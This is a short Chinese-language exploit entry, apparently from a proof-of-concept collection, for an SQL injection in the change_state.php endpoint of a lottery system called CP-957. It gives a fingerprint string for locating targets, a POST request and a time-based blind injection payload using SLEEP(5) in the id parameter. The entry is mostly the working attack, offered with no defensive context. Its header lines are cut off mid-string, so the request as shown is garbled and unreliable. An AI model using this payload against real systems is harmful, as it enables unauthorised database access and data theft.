# CP-957娱乐大富彩票系统change_state存在SQL注入漏洞

- **系统**：CP-957　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"/Agent.index.do"`
- **请求**：`POST /change_state.php HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`

**请求体 / payload**
```
KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Content-Type: application/x-www-form-urlencoded
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-User: ?1
Content-Length: 46
id=(SELECT 6666 FROM (SELECT(SLEEP(5)))Bypass)
```
- **预期**：200　|　—